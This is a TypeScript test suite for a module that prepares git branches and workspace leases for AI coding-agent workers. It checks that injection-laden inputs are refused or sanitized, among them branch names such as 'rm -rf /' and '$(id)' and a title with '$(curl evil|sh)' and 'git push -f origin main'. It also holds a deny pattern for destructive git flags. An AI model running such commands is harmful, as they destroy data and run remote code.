import { describe, expect, it } from "vitest";
import { planBranch } from "../branches/planner";
import type { BranchPlanRequest, NewBranchPlan, ReuseBranchPlan } from "../branches/types";
import { createClaudeCodeAdapter } from "../workers/claudeCode";
import { createFakeGit, createFakePromptFiles, createFakeRunner, createFakeTimer } from "../workers/fake";
import type { GitInspector, GitStatus, ProcessExit, ProcessRunner, ProcessSpec, WorkerTaskContract } from "../workers/types";
import { assignWorkerBranch } from "./flow";
import { createWorkspaceLeaseRegistry } from "./lease";
import {
  buildCreateSwitchArgs,
  buildFetchArgs,
  buildResolveArgs,
  buildSwitchArgs,
  checkWorkerPreconditions,
  isPreparedWorkspace,
  prepareAssignedWorkspace,
  WORKSPACE_GIT_SUBCOMMANDS,
} from "./workspace";

const BASE = "a".repeat(40);
const HEAD = "b".repeat(40);
const MOVED = "e".repeat(40);
const ROOT = "/workspaces/oxm-platform";
const NEW_BRANCH = "agent/task-t1-fix-search";
const REUSE_BRANCH = "agent/task-root1-epic";

const req = (over: Partial<BranchPlanRequest> = {}): BranchPlanRequest => ({
  taskId: "t1",
  category: "bug_fix",
  title: "Fix search",
  expectedPaths: ["client/src/pages/Search.tsx"],
  baseBranch: "main",
  baseSha: BASE,
  ...over,
});

const newPlan = () => planBranch(req(), { active: [] }) as NewBranchPlan;
const reusePlan = () =>
  planBranch(
    req({
      taskId: "t2",
      lineage: { rootTaskId: "root1", title: "Epic" },
      allowReuse: true,
      existingBranch: {
        name: REUSE_BRANCH,
        headSha: HEAD,
        baseSha: BASE,
        lineageId: "root1",
        prNumber: 7,
        prState: "open",
        changedPaths: ["client/src/pages/Search.tsx"],
        workerRunning: false,
      },
    }),
    { active: [] },
  ) as ReuseBranchPlan;

interface FakeRepo {
  current: string; // branch name or "HEAD" when detached
  detachedSha: string;
  local: Map<string, string>;
  remote: Map<string, string>;
  tracking: Map<string, string>;
  dirty: string[];
  /** When set, `switch` reports success but does not move (simulates a lying/failed switch). */
  brokenSwitch?: boolean;
}

/** Fake git over an in-memory repo: interprets only the argv this module may emit. */
function fakeGit(repo: FakeRepo) {
  const specs: ProcessSpec[] = [];
  const exit = (e: Partial<ProcessExit>) => ({
    exit: Promise.resolve({ exitCode: 0, signal: null, stdout: "", stderr: "", truncated: false, ...e }),
    kill() {},
  });
  const runner: ProcessRunner = {
    spawn(spec) {
      specs.push({ ...spec, args: [...spec.args] });
      const a = spec.args;
      if (spec.command !== "git") return exit({ exitCode: 127 });
      if (a[0] === "fetch") {
        const [src, dst] = a[a.length - 1].split(":");
        const b = src.replace("refs/heads/", "");
        if (!repo.remote.has(b) || dst !== `refs/remotes/origin/${b}`) return exit({ exitCode: 128 });
        repo.tracking.set(b, repo.remote.get(b)!);
        return exit({});
      }
      if (a[0] === "rev-parse") {
        const ref = a[a.length - 1].replace("^{commit}", "");
        const sha = ref.startsWith("refs/heads/")
          ? repo.local.get(ref.slice("refs/heads/".length))
          : repo.tracking.get(ref.slice("refs/remotes/origin/".length));
        return sha ? exit({ stdout: `${sha}\n` }) : exit({ exitCode: 1 });
      }
      if (a[0] === "switch" && a.includes("--create")) {
        const [b, sha] = a.slice(-2);
        if (repo.local.has(b)) return exit({ exitCode: 128 });
        repo.local.set(b, sha);
        if (!repo.brokenSwitch) repo.current = b;
        return exit({});
      }
      if (a[0] === "switch") {
        const b = a[a.length - 1];
        if (!repo.local.has(b)) return exit({ exitCode: 128 });
        if (!repo.brokenSwitch) repo.current = b;
        return exit({});
      }
      return exit({ exitCode: 99 });
    },
  };
  const status = (): GitStatus => ({
    branch: repo.current,
    headSha: repo.current === "HEAD" ? repo.detachedSha : repo.local.get(repo.current) ?? "",
    dirtyPaths: [...repo.dirty],
  });
  const git: GitInspector = { status: async () => status(), changedPathsSince: async () => [] };
  return { runner, git, specs, status };
}

function setup(plan: NewBranchPlan | ReuseBranchPlan, repoOver: Partial<FakeRepo> = {}) {
  const repo: FakeRepo = {
    current: "main",
    detachedSha: BASE,
    local: new Map([["main", BASE]]),
    remote: new Map([["main", BASE], [NEW_BRANCH, BASE], [REUSE_BRANCH, HEAD]]),
    tracking: new Map(),
    dirty: [],
    ...repoOver,
  };
  const g = fakeGit(repo);
  const leases = createWorkspaceLeaseRegistry();
  const leaseRes = leases.acquire({ workspaceId: "ws-1", taskId: plan.taskId, lineageId: plan.lineageId, branch: plan.branch });
  if (!leaseRes.ok) throw new Error(leaseRes.reason);
  const deps = { runner: g.runner, git: g.git, repoRoot: ROOT, leases };
  const creation = plan.decision === "new_branch" ? { taskId: plan.taskId, branch: plan.branch, baseSha: plan.baseSha, alreadyExisted: false } : null;
  return { repo, ...g, leases, lease: leaseRes.lease, deps, creation };
}

const contractFor = (taskId: string): Omit<WorkerTaskContract, "branch"> => ({
  taskId,
  runId: "run-1",
  category: "bug_fix",
  actions: [{ kind: "code_edit" }],
  objective: "fix",
  allowedScope: ["client/"],
  acceptanceCriteria: [],
  requiredValidations: ["tests"],
});

const FORBIDDEN_GIT = /^(reset|merge|rebase|clean|checkout|push|branch|pull|cherry-pick|update-ref|stash|restore)$/;
const assertSafeArgv = (specs: ProcessSpec[]) => {
  for (const s of specs) {
    expect(s.command).toBe("git");
    expect(WORKSPACE_GIT_SUBCOMMANDS as readonly string[]).toContain(s.args[0]);
    expect(s.args[0]).not.toMatch(FORBIDDEN_GIT);
    for (const arg of s.args) {
      expect(arg).not.toMatch(/^--(force|hard|discard-changes|merge|force-create)$|^-[fCB]$|^\+|refs\/heads\/(main|master)\b/);
    }
    expect(s.args).not.toContain("main");
    expect(s.args).not.toContain("master");
  }
};

describe("prepareAssignedWorkspace: new branch", () => {
  it("fetches the exact branch, creates it locally at the planned base SHA, and verifies", async () => {
    const plan = newPlan();
    const s = setup(plan);
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps);
    expect(res).toMatchObject({ ok: true, prepared: { taskId: "t1", branch: NEW_BRANCH, headSha: BASE, workspaceId: "ws-1" } });
    expect(s.specs.map((x) => x.args)).toEqual([
      ["fetch", "--no-tags", "--no-recurse-submodules", "origin", `refs/heads/${NEW_BRANCH}:refs/remotes/origin/${NEW_BRANCH}`],
      ["rev-parse", "--verify", "--quiet", `refs/remotes/origin/${NEW_BRANCH}^{commit}`],
      ["rev-parse", "--verify", "--quiet", `refs/heads/${NEW_BRANCH}^{commit}`],
      ["switch", "--no-track", "--create", NEW_BRANCH, BASE],
    ]);
    expect(s.specs.every((x) => x.cwd === ROOT)).toBe(true);
    assertSafeArgv(s.specs);
    expect(s.status()).toEqual({ branch: NEW_BRANCH, headSha: BASE, dirtyPaths: [] });
  });

  it("requires the branch to have been created (matching the plan) first", async () => {
    const plan = newPlan();
    const s = setup(plan);
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps)).toMatchObject({ error: "policy_violation" });
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: { ...s.creation!, baseSha: MOVED } }, s.deps)).toMatchObject({ error: "policy_violation" });
    expect(s.specs).toHaveLength(0);
  });

  it("missing remote branch → branch_missing", async () => {
    const plan = newPlan();
    const s = setup(plan);
    s.repo.remote.delete(NEW_BRANCH);
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "branch_missing" });
    expect(s.repo.current).toBe("main");
  });
});

describe("prepareAssignedWorkspace: reuse branch", () => {
  it("switches to an existing local branch already at the plan's accepted head", async () => {
    const plan = reusePlan();
    const s = setup(plan, { local: new Map([["main", BASE], [REUSE_BRANCH, HEAD]]) });
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps);
    expect(res).toMatchObject({ ok: true, prepared: { branch: REUSE_BRANCH, headSha: HEAD, taskId: "t2" } });
    expect(s.specs.at(-1)?.args).toEqual(["switch", "--no-guess", REUSE_BRANCH]);
    assertSafeArgv(s.specs);
  });

  it("creates the local branch at the accepted head when absent", async () => {
    const plan = reusePlan();
    const s = setup(plan);
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps)).toMatchObject({ ok: true, prepared: { headSha: HEAD } });
    expect(s.specs.at(-1)?.args).toEqual(["switch", "--no-track", "--create", REUSE_BRANCH, HEAD]);
  });

  it("does not switch when already on the branch at the right SHA", async () => {
    const plan = reusePlan();
    const s = setup(plan, { current: REUSE_BRANCH, local: new Map([[REUSE_BRANCH, HEAD]]) });
    expect((await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps)).ok).toBe(true);
    expect(s.specs.some((x) => x.args[0] === "switch")).toBe(false);
  });

  it("remote moved unexpectedly → remote_moved (fail closed, no switch)", async () => {
    const plan = reusePlan();
    const s = setup(plan);
    s.repo.remote.set(REUSE_BRANCH, MOVED);
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps);
    expect(res).toMatchObject({ ok: false, error: "remote_moved", reason: expect.stringMatching(/re-plan required/) });
    expect(s.specs.some((x) => x.args[0] === "switch")).toBe(false);
    expect(s.repo.current).toBe("main");
  });

  it("new branch whose remote is not at the base SHA → remote_moved", async () => {
    const plan = newPlan();
    const s = setup(plan);
    s.repo.remote.set(NEW_BRANCH, MOVED);
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "remote_moved" });
  });

  it("local branch at a different SHA → local_diverged; never moved/reset", async () => {
    const plan = reusePlan();
    const s = setup(plan, { local: new Map([["main", BASE], [REUSE_BRANCH, MOVED]]) });
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease }, s.deps)).toMatchObject({ error: "local_diverged" });
    expect(s.repo.local.get(REUSE_BRANCH)).toBe(MOVED);
    expect(s.specs.some((x) => x.args[0] === "switch")).toBe(false);
  });
});

describe("prepareAssignedWorkspace: preflight refusals", () => {
  it("detached HEAD → detached_head before any git op", async () => {
    const plan = newPlan();
    const s = setup(plan, { current: "HEAD" });
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "detached_head" });
    expect(s.specs).toHaveLength(0);
  });

  it("dirty worktree → dirty_worktree; explicitly allowed dirty paths pass", async () => {
    const plan = newPlan();
    const s = setup(plan, { dirty: ["server/secret-wip.ts"] });
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "dirty_worktree" });
    expect(s.specs).toHaveLength(0);
    const ok = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation, allowedDirtyPaths: ["server/secret-wip.ts"] }, s.deps);
    expect(ok.ok).toBe(true);
  });

  it("wrong current branch after switching → verification_failed", async () => {
    const plan = newPlan();
    const s = setup(plan, { brokenSwitch: true });
    expect(await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "verification_failed" });
  });

  it("plans not created by the planner (copied, forged, protected, queue/reject) are refused", async () => {
    const plan = newPlan();
    const s = setup(plan);
    for (const p of [
      { ...plan },
      Object.freeze({ ...plan, branch: "main" }),
      Object.freeze({ ...plan, branch: "master" }),
      planBranch(req({ requestedBranch: "main" }), { active: [] }),
      null,
    ]) {
      expect(await prepareAssignedWorkspace({ plan: p, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "policy_violation" });
    }
    expect(s.specs).toHaveLength(0);
  });

  it("protected branches cannot even be leased", () => {
    const leases = createWorkspaceLeaseRegistry();
    for (const branch of ["main", "master", "refs/heads/main"]) {
      expect(leases.acquire({ workspaceId: "ws", taskId: "t1", lineageId: "t1", branch }).ok).toBe(false);
    }
  });

  it("lease conflict: task B cannot prepare a workspace leased to task A", async () => {
    const planA = newPlan();
    const s = setup(planA);
    const planB = planBranch(req({ taskId: "t2", title: "Other", expectedPaths: ["server/x.ts"] }), { active: [] }) as NewBranchPlan;
    expect(s.leases.acquire({ workspaceId: "ws-1", taskId: "t2", lineageId: "t2", branch: planB.branch })).toMatchObject({ error: "lease_conflict" });
    const creationB = { taskId: "t2", branch: planB.branch, baseSha: BASE, alreadyExisted: false };
    expect(await prepareAssignedWorkspace({ plan: planB, lease: s.lease, creation: creationB }, s.deps)).toMatchObject({ error: "lease_conflict" });
    expect(await prepareAssignedWorkspace({ plan: planA, lease: { ...s.lease }, creation: s.creation }, s.deps)).toMatchObject({ error: "lease_conflict" });
    s.leases.release(s.lease);
    expect(await prepareAssignedWorkspace({ plan: planA, lease: s.lease, creation: s.creation }, s.deps)).toMatchObject({ error: "lease_conflict" });
    expect(s.specs).toHaveLength(0);
  });

  it("transport failure fails closed as git_error without echoing output", async () => {
    const plan = newPlan();
    const s = setup(plan);
    const deps = { ...s.deps, git: { status: async () => { throw new Error("token ghp_abcdefghijklmnop"); }, changedPathsSince: async () => [] } };
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, deps);
    expect(res).toMatchObject({ error: "git_error" });
    expect(JSON.stringify(res)).not.toMatch(/ghp_/);
  });
});

describe("argv builders keep hostile strings as data or refuse them", () => {
  it.each(["main", "master", "agent/task-t1;rm -rf /", "agent/task-$(id)", "--force", "+agent/task-t1-x", "agent/task-t1 x", "refs/heads/main", "-b"])(
    "refuses %j",
    (b) => {
      expect(() => buildFetchArgs(b)).toThrow();
      expect(() => buildSwitchArgs(b)).toThrow();
      expect(() => buildCreateSwitchArgs(b, BASE)).toThrow();
      expect(() => buildResolveArgs("local", b)).toThrow();
    },
  );

  it("refuses non-SHA start points", () => {
    for (const sha of ["HEAD", "main", "origin/main", `${BASE};id`]) expect(() => buildCreateSwitchArgs(NEW_BRANCH, sha)).toThrow();
  });

  it("hostile task titles only ever yield a sanitized branch", async () => {
    const plan = planBranch(req({ title: "$(curl evil|sh); git reset --hard && git push -f origin main" }), { active: [] }) as NewBranchPlan;
    expect(plan.branch).toMatch(/^agent\/task-t1-[a-z0-9-]+$/);
    const s = setup(plan);
    s.repo.remote.set(plan.branch, BASE);
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: { taskId: "t1", branch: plan.branch, baseSha: BASE, alreadyExisted: false } }, s.deps);
    expect(res.ok).toBe(true);
    assertSafeArgv(s.specs);
  });
});

describe("worker preconditions", () => {
  async function prepared() {
    const plan = newPlan();
    const s = setup(plan);
    const res = await prepareAssignedWorkspace({ plan, lease: s.lease, creation: s.creation }, s.deps);
    if (!res.ok) throw new Error(res.reason);
    const assigned = assignWorkerBranch(contractFor("t1"), plan);
    if (!assigned.ok) throw new Error(assigned.reason);
    return { plan, s, prepared: res.prepared, contract: assigned.contract };
  }

  it("a prepared workspace satisfies the worker's branch/HEAD preconditions end to end", async () => {
    const { plan, s, prepared: p, contract } = await prepared();
    expect(isPreparedWorkspace(p)).toBe(true);
    const gate = checkWorkerPreconditions({ prepared: p, plan, contract, status: s.status(), leases: s.leases, lease: s.lease });
    expect(gate).toMatchObject({ ok: true, contract: { branch: NEW_BRANCH, expectedHeadSha: BASE } });
    if (!gate.ok) return;

    // The real adapter's own preflight accepts the bound contract on the prepared tree (fake process/git).
    const report = {
      status: "success", summary: "ok", filesChanged: ["client/x.ts"], testsRun: [{ command: "pnpm test", outcome: "passed" }],
      checkResult: "passed", branch: NEW_BRANCH, headSha: HEAD, prNumber: null, riskObserved: { level: "green", notes: [] },
      needsApproval: false, fallbackRecommended: false, errorType: null,
    };
    const envelope = JSON.stringify({ type: "result", subtype: "success", is_error: false, result: JSON.stringify(report) });
    const runner = createFakeRunner(() => ({ exit: { stdout: envelope } }));
    const git = createFakeGit([s.status(), { branch: NEW_BRANCH, headSha: HEAD, dirtyPaths: [] }], ["client/x.ts"]);
    const adapter = createClaudeCodeAdapter({ model: "claude-opus-5-5", repoRoot: ROOT, timeoutMs: 60_000 }, { runner, git, promptFiles: createFakePromptFiles(), timer: createFakeTimer() });
    const result = await adapter.start({ contract: gate.contract, now: "2026-10-04T00:00:00.000Z" }).result;
    expect(result).toMatchObject({ status: "success", branch: NEW_BRANCH, prNumber: null });
    // The worker itself never ran git switch/fetch: only the claude process was spawned.
    expect(runner.specs.map((x) => x.command)).toEqual(["claude"]);
  });

  it("fails closed when the workspace drifted, lease was lost, or the proof is forged", async () => {
    const { plan, s, prepared: p, contract } = await prepared();
    const base = { prepared: p, plan, contract, status: s.status(), leases: s.leases, lease: s.lease };
    expect(checkWorkerPreconditions({ ...base, status: { ...s.status(), branch: "main" } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, status: { ...s.status(), branch: "HEAD" } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, status: { ...s.status(), headSha: MOVED } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, status: { ...s.status(), dirtyPaths: ["x.ts"] } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, prepared: { ...p } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, contract: { ...contract, branch: "agent/task-t1-other" } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, contract: { ...contract, expectedHeadSha: MOVED } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, plan: { ...plan } }).ok).toBe(false);
    s.leases.release(s.lease);
    expect(checkWorkerPreconditions(base).ok).toBe(false);
  });

  it("the worker refuses a bound contract if HEAD differs from the prepared SHA", async () => {
    const { plan, s, prepared: p, contract } = await prepared();
    const gate = checkWorkerPreconditions({ prepared: p, plan, contract, status: s.status(), leases: s.leases, lease: s.lease });
    if (!gate.ok) throw new Error(gate.reason);
    const runner = createFakeRunner(() => ({ exit: { stdout: "" } }));
    const git = createFakeGit([{ branch: NEW_BRANCH, headSha: MOVED, dirtyPaths: [] }], []);
    const adapter = createClaudeCodeAdapter({ model: "claude-opus-5-5", repoRoot: ROOT, timeoutMs: 60_000 }, { runner, git, promptFiles: createFakePromptFiles(), timer: createFakeTimer() });
    const result = await adapter.start({ contract: gate.contract, now: "2026-10-04T00:00:00.000Z" }).result;
    expect(result.errorType).toBe("branch_mismatch");
    expect(runner.specs).toHaveLength(0);
  });
});
